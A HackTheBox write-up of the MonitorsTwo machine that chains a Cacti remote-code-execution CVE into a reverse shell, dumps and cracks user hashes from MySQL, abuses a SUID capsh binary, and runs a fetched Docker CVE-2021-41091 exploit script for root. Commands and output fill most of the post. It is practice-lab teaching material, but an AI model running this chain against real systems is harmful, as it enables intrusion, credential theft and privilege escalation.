---
layout: single
title: MonitorsTwo hackthebox writeup
excerpt: "Easy linux machine in which we hack cacti with a CVE, get credentials from a SQL database, and exploit a docker CVE to escalate privileges"
date: 2023-05-30
classes: wide
header:
  teaser: /assets/images/monitorstwo/monitorstwo_icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - writeup
tags:
  - hackthebox
  - CVE
  - MySQL
  - docker
  - SUID
---

![](/assets/images/monitorstwo/monitorstwo.png)

## User Flag

```shell
$nmap -sS -p- -n -Pn --min-rate 5000 -oN allports -vv 10.10.11.211
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

We start by looking at port 80 which has a cacti login. Since we've just started the machine it makes no sense to try and login however, the cacti version caught my eye. Thus I searched for `` Cacti Version 1.2.22 `` on google and found a CVE. I downloaded the script from [exploit-db](https://www.exploit-db.com/exploits/51166) but it wasn't working. So I decided to try with metasploit although the exploit ''succeded'' I wasn't able to open a reverse shell. Then I found another exploit in [github](https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit) that finally worked. Another option could have been debugging the metasploit exploit with tcdump however, that was my last resort.

```shell
$ python3 cacti.py
Enter the target address (like 'http://123.123.123.123:8080')http://10.10.11.211
Checking vulnerability...
App is vulnerable
Brute forcing id...
Enter your IPv4 address10.10.14.79
Enter the port you want to listen on7777
Delivering payload...
...
$ nc -lvp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.211 58160
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ ^Z
zsh: suspended  nc -lvp 7777
$ stty raw -echo;fg
[1]  - continued  nc -lvp 7777
                              script /dev/null -c bash
                                                      Script started, output log file is '/dev/null'.
                                                                                                     bash-5.1$
bash-5.1$ export TERM=xterm
```

Although it seems we are in the machine after inspecting the ''machine'' for a bit It's easy to realize this is just a docker container. Luckily enough the entrypoint gives us some useful information.

```shell
bash-5.1$ cat /entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```

It is connected to a mysql database and we have user and password.

```shell
bash-5.1$ mysql --host=db --user=root --password=root cacti
MySQL [cacti]> show tables;
+-------------------------------------+
| Tables_in_cacti                     |
+-------------------------------------+
| aggregate_graph_templates           |
| aggregate_graph_templates_graph     |
| aggregate_graph_templates_item      |
| aggregate_graphs                    |
| aggregate_graphs_graph_item         |
...
| user_auth                           |
| user_auth_cache                     |
| user_auth_group                     |
| user_auth_group_members             |
| user_auth_group_perms               |
| user_auth_group_realm               |
| user_auth_perms                     |
| user_auth_realm                     |
| user_domains                        |
| user_domains_ldap                   |
| user_log                            |
| vdef                                |
| vdef_items                          |
| version                             |
+-------------------------------------+
```

Cacti has a huge database but we're just idealy looking for credentials which may be in the ``user_auth`` table.

```shell
MySQL [cacti]> select * from user_auth;
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
| id | username | password                                                     | realm | full_name      | email_address          | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
|  1 | admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |     0 | Jamie Thompson | admin@monitorstwo.htb  |                      | on              | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   663348655 |
|  3 | guest    | 43e9a4ab75570f5b                                             |     0 | Guest Account  |                        | on                   | on              | on        | on        | on           | 3              |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |           0 |
|  4 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |     0 | Marcus Brune   | marcus@monitorstwo.htb |                      |                 | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  | on     |               0 |        0 |  2135691668 |
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+

```

We have three user however, my experience in hack the box machines tells me we can't crack the admin hash so let's try with marcus. The hash type is a Unix blowfish, you can look it up in [hashcat's wiki](https://hashcat.net/wiki/doku.php?id=example_hashes)

```shell
$ hashcat -m 3200 hash2 ~/wordlist/rockyou.txt
...
$ hashcat -m 3200 hash2 ~/wordlist/rockyou.txt --show
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
```

Using this user a password in cacti prompts with a message saying `` You do not have access to any area of Cacti. Contact your administrator. `` Thus, let's try ssh.

```shell
ssh marcus@10.10.11.211
marcus@10.10.11.211's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 30 May 2023 03:32:28 PM UTC

  System load:                      1.52
  Usage of /:                       63.2% of 6.73GB
  Memory usage:                     27%
  Swap usage:                       0%
  Processes:                        279
  Users logged in:                  1
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.211
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:e2d3

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Tue May 30 15:21:58 2023 from 10.10.14.134
marcus@monitorstwo:~$
```

## Root Flag

The first thing that caught my eye was the ``You have mail.`` message. The mail is actually a really good hint on how to privesc.

```shell
marcus@monitorstwo:~$ cat /var/spool/mail/marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject
malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

From these CVE's the XSS is meaningless at this point and the kernel one seems too obscure meanwhile, the docker seems like an easy one. According to the CVE if we manage to get root in the container we can get root in the real machine. This [github repo](https://github.com/UncleJ4ck/CVE-2021-41091) explains it really well and comes with an exploit. Now back to the container.


```shell
bash-5.1$ find / -perm -4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/bash
/bin/su
```

One of the first things one should do when trying to privesc is searching for SUID binaries, in this case we hit jackpot since capsh (a linux tool used to manage capabilities) can be used to privesc just like [GTFO bins](https://gtfobins.github.io/gtfobins/capsh/) explains.

```shell
bash-5.1$ capsh --gid=0 --uid=0 --
root@50bca5e748b0:/var/www/html# chmod u+s /bin/bash
```

Now we just have to run the exploit.

```shell
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
...
marcus@monitorstwo:/dev/shm$ wget 10.10.14.79:8000/exp.sh
--2023-05-30 15:47:01--  http://10.10.14.79:8000/exp.sh
Connecting to 10.10.14.79:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2446 (2.4K) [application/x-sh]
Saving to: ‘exp.sh’

exp.sh                                                    100%[====================================================================================================================================>]   2.39K  --.-KB/s    in 0s

2023-05-30 15:47:01 (13.4 MB/s) - ‘exp.sh’ saved [2446/2446]

marcus@monitorstwo:/dev/shm$ chmod a+x exp.sh
marcus@monitorstwo:/dev/shm$ ./exp.sh
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit
marcus@monitorstwo:/dev/shm$
```

For some reason the exploit didn't spawn a shell but by following the instructions we can just do it by ourselves.

```shell
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
bash-5.1# whoami
root
```

That's all, thanks for reading!.
